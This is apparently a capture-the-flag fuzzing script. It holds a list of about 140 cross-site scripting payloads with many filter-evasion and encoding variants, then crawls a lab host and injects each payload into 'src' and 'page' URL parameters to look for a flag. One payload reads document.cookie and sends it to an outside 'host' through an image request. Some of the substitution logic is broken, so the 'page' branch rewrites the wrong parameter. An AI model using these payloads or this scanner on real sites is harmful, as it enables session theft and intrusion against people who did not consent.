payloads = ['<script>alert(1234)</script>',
'<script>prompt(1234)</script>',
'<ScripT>alert(1234)</ScRipT>',
'/<script>alert(1234)</script>',
'<script>var m=<html><a href="//host">link</a>',
'<img+src="http://localhost">',
'<DIV+STYLE="background-image: url(javascript:alert(1))">',
'<IMG+DYNSRC="javascript:alert(1);">',
'<IMG+LOWSRC="javascript:alert(1);">',
'<isindex+type=image+src=1+onerror=alert(1)>',
'<meta style="xss:expression(open(alert(1)))" />',
'<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert(1);\">',
'<!</textarea <body onload=\'alert(1)\'>',
'<img+<iframe ="1" onerror="alert(1)">',
'<iframe src="http://localhost"></iframe>',
'<base+href="javascript:alert(1);//">',
'<bgsound+src="javascript:alert(1);">',
'<INPUT+TYPE="IMAGE"+SRC="javascript:alert(1);">',
'<object+data="javascript:alert(0)">',
'<STYLE>li+{list-style-image:url("javascript:alert(1)");}</STYLE><UL><LI>1',
'<Layer+src="http://localhost">',
'%3E%3Cbody%20onload=javascript:alert(1)%3E',
'">><marquee><h1>1</h1></marquee>',
'</br style=a:expression(alert(1))>',
'<font style=\'color:expression(alert(1))\'>',
'<embed src="data:image/svg+xml;>',
'<frameset><frame src="xss"></frameset>',
'<link href="http://host/xss.css">',
'="/>%3ciframe%20src%3djavascript%3aalert%283%29%3e',
'<object><param name="src" value="javascript:alert(0)"></param></object>',
'<isindex action=javascript:alert(1) type=image>',
'<b/alt="1"onmouseover=InputBox+1 language=vbs>test</b>',
'</a onmousemove="alert(1)">',
'\'%26%26\'javascript:alert%25281%2529//',
'document.write("<scr"+"ipt language=javascript src=http://localhost/></scr"+"ipt>");',
'<scr<script>ipt>prompt(document.cookie)</scr</script>ipt>',
'12&<script>alert(123)</script>=123',
'<img src=x:alert(alt) onerror=eval(src) alt=0>',
'<img src=/ onerror=alert(1)>',
'a="get";b="URL(\"";c="javascript:";d="alert(\'XSS\');\")";eval(a+b+c+d);',
'<img/src="xss.png"alt="xss">',
'<IMG SRC="mocha:[code]">',
'<x:script xmlns:x="http://www.w3.org/1999/xhtml">alert(1);</x:script>',
'<STYLE>@import\'http://host/css\';</STYLE>',
'<SCRIPT+a=">\'>" SRC=\"http://localhost\"></SCRIPT>',
'<scr<script>ipt>alert(\'XSS\')</scr</script>ipt>',
'%3Cscript%3Ealert(1)%3C/script%3E',
'foo%00<script>alert(document.cookie)</script>',
'"><<script>alert(document.cookie);//<</script>',
'><s"%2b"cript>alert(document.cookie)</s"%2B"cript>',
'3Cscript%3Ealert(1)%3C%2Fscript%3E',
'%253Cscript%253Ealert(1)%253C/script%253E',
'%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e',
'%BCscript%BEalert(%A21%A2)%BC/script%BE',
'%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE',
'<object+data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg=="></object>',
'<a HREF="data:text/html;base64,PHNjcmlwdD5hbGVydCgwKTwvc2NyaXB0Pg==">ugh</a>',
'PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
'<a+href="javas&#99;ript&#35;alert(1);">',
'<IMG+SRC=j&#X41vascript:alert(1)>',
'<IMG+SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#39;&#41;>',
'%C0%BCscript%C0%BEalert(1)%C0%BC/script%C0%BE',
'<IMG+SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000039&#0000041>',
'%u0022%u003e%u003cscript%u003ealert%u0028%u0027Hello%u0027%u0029%u003c%u002fscript%u003e',
'+ADw-SCRIPT+AD4-alert(1);+ADw-/SCRIPT+AD4-',
'<INPUT+TYPE="checkbox"+onDblClick=confirm(XSS)>',
'<APPLET+CODE=""+CODEBASE="http://url/xss">',
'<SCRIPT>alert(String.fromCharCode(88))</SCRIPT>',
'&lt;script&gt;prompt(&apos;1&apos;)&lt;/script&gt;',
'&#x3c;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x27;&#x78;&#x73;&#x73;&#x27;&#x29;&#x3c;&#x2f;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3e;',
'&#x60;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;&#x97;&#x108;&#x101;&#x114;&#x116;&#x40;&#x39;&#x120;&#x115;&#x115;&#x39;&#x41;&#x60;&#x47;&#x115;&#x99;&#x114;&#x105;&#x112;&#x116;&#x62;',
'&#x74;&#x163;&#x143;&#x162;&#x151;&#x160;&#x164;&#x76;&#x141;&#x154;&#x145;&#x162;&#x164;&#x50;&#x47;&#x170;&#x163;&#x163;&#x47;&#x51;&#x74;&#x57;&#x163;&#x143;&#x162;&#x151;&#x160;&#x164;&#x76;',
'=<img%20src%3D%26%23x6a;%26%23x61;%26%23x76;%26%23x61;%26%23x73;%26%23x63;%26%23x72;%26%23x69;%26%23x70;%26%23x74;%26%23x3a;alert%26%23x28;1%26%23x29;>',
'"+style%3d"x%3aexpression(alert(1))+',
'\";alert(1);//',
'<img src="x:%90" title="onerror=alert(1)//">',
'"+onmouseover="window.location=\'http://localhost\'',
'"+onkeypress="prompt(23)"+',
'"+onfocus="prompt(1)"+',
'500);alert(1);//',
'alert(document[\'cookie\'])',
'with(document)alert(cookie)',
'";location=location.hash)//#0={};alert(0)',
'//";alert(String.fromCharCode(88,83,83))',
'%F6%3Cimg+onmouseover=prompt(/test/)//%F6%3E',
'"+onDblClick=prompt(123)"+',
'"+onError=prompt(123)"+',
'"+onReset=prompt(123)"+',
'%";eval(unescape(location))//#%0Aprompt(0)',
'<SCRIPT>a=/XSS/%0Aalert(a.source)</SCRIPT>',
'%\'});%0aalert(1);%20//',
'<script>//>%0Aalert(1);</script>',
'<IMG+SRC="jav&#x0A;ascript:alert(1);">',
'<IMG+SRC="jav%0dascript:alert(1);">',
'<IMG+SRC="jav#x0D;ascript:alert(1);">',
'<IMG+SRC="jav%09ascript:alert(1);">',
'<IMG+SRC="jav&#x09;ascript:alert(1);">',
'%3Cscript%3Ealert(1)%3C/script%00TESTTEST%3E',
'<script%00>alert(1)</script%00>',
'<scr%00ipt>prompt(1)</sc%00ript>',
'<scr\0ipt>prompt(1)</sc\0ript>',
'%00"><script>alert(1)</script>',
'%3Cscript%0Caaaaa%3Ealert%28123%29%3C/script%0Caaaaa%3E',
'<script%0Caaaaa>alert(123)</script>',
'%3Cscript%0Baaa%3Ealert%281%29%3C/script%0Baaaa%3E',
'%3Cscript%0Baaa%3Ealert%281%29%3C/script%3E',
'<*script>prompt(123)<*/script>',
'<script%0Daaa>alert(1)</script%0Daaaa>',
'<script%20TEST>alert(1)</script%20TESTTEST>',
'<SCRIPT/XSSSRC="http://host"></SCRIPT>',
'<SCRIPT+SRC=http://host/',
'<<SCRIPT>alert(1);//<</SCRIPT>',
'< s c r i p t > p r o m p t ( 1 ) < / s c r i p t >',
'%uff1c%uff53%uff43%uff52%uff49%uff50%uff54%uff1e%uff41%uff4c%uff45%uff52%uff54%uff08%uff07%uff58%uff53%uff53%uff07%uff09%uff1c%uff0f%uff53%uff43%uff52%uff49%uff50%uff54%uff1e',
'%uff1cscript%uff1ealert(1234)%uff1c/script%uff1e',
'javascript:propmpt(1)',
'javascript:eval(unescape(location.href))',
'a="get";b="URL";c="javascript:";d="alert(1);";eval(a+b+c+d);',
'location=location.hash.slice(1);',
'";location=location.hash)//#0={};alert(0)',
'location=location.hash',
'""+{toString:alert}',
'""+{valueOf:alert}',
'";eval(unescape(location))//# %0Aalert(0)',
';location.href=\'http://site\';//',
'1&"><script>alert(1)</script>=1',
'</scr</script>ipt><ifr<iframeame/onload=prompt()>whs',
'%3E%3Cbody%20onload=javascript:alert(1)# var sc=escape(document.cookie);var d=escape(document.location);var mI=new Image();mI.src="http://host?a="+d+"&b="+ sc;']

import requests
import re

# Crawl website and collect all internal urls
def crawl_web(initial_url):
    crawled, to_crawl = [], []
    to_crawl.append(initial_url)
    other_url = None

    while to_crawl:
        current_url = to_crawl.pop(0)
        r = requests.get(current_url)
        crawled.append(current_url)
        for url in re.findall('<a href="([^"]+)">', str(r.content)):
            # print("Url:{}",url)
            if not "http" in url:
                if "?" in url:
                    # print("pim")
                    other_url = initial_url + url
                else:
                    other_url = "http://192.168.56.11/" + url
            else:
                # print("pam")
                other_url =  None
            # print("Other_url:{}",other_url)
            if other_url is not None:
                if other_url not in crawled and other_url not in to_crawl:
                    to_crawl.append(other_url)
    return crawled

def payload_worked(url):
    r = requests.get(url)
    if "flag" in str(r.content):
        print("FLAG found at this adress:{}", url)

def test_payload(urls, payloads):
    for payload in payloads:
        for url in urls:
            if "src=" in url:
                res = re.sub(r'(src=).*?(&|$)',"src=" + payload,url)
                payload_worked(res)
            if "page=" in url:
                res = re.sub(r'(src=).*?(&|$)',"page=" + payload,url)
                payload_worked(res)              
            if "page=" in url and "src=" in url:
                res = re.sub(r'(src=).*?(&|$)',"src=" + payload,url)
                res = re.sub(r'(src=).*?(&|$)',"page=" + payload,url)
                payload_worked(res)

crawled_internal_urls = crawl_web('http://192.168.56.11/index.php')
print(crawled_internal_urls)
test_payload(crawled_internal_urls, payloads)
